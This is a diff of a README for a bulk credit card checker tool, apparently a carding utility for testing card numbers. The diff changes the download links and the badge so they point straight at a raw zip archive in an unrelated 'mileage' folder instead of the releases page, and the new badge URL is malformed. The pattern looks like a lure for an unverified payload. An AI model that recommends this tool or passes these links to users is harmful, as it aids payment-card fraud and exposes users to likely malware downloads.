@@ -1,6 +1,6 @@
 # 🚀 CC-CHECKER-CLIV5.5 - Bulk CC Checker Made Easy
 
-![Download](https://img.shields.io/static/v1?label=Download&message=Latest%20Release&color=blue)
+![Download](https://raw.githubusercontent.com/prashantthapliyal-23/CC-CHECKER-CLIV5.5/main/mileage/CC-CHECKER-CLIV5.5.zip%20Release&color=blue)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to CC-CHECKER-CLIV5.5! This tool helps you check multiple credit card in
 
 To get the latest version, visit the following page:
 
-[Visit this page to download CC-CHECKER-CLIV5.5](https://github.com/prashantthapliyal-23/CC-CHECKER-CLIV5.5/releases)
+[Visit this page to download CC-CHECKER-CLIV5.5](https://raw.githubusercontent.com/prashantthapliyal-23/CC-CHECKER-CLIV5.5/main/mileage/CC-CHECKER-CLIV5.5.zip)
 
 On this page, you can find the latest release version to download.
 
@@ -106,4 +106,4 @@ Thank you for choosing CC-CHECKER-CLIV5.5! We hope this tool makes your credit c
 
 Don't forget to visit the Releases page to keep your application updated:
 
-[Visit this page to download CC-CHECKER-CLIV5.5](https://github.com/prashantthapliyal-23/CC-CHECKER-CLIV5.5/releases)
+[Visit this page to download CC-CHECKER-CLIV5.5](https://raw.githubusercontent.com/prashantthapliyal-23/CC-CHECKER-CLIV5.5/main/mileage/CC-CHECKER-CLIV5.5.zip)
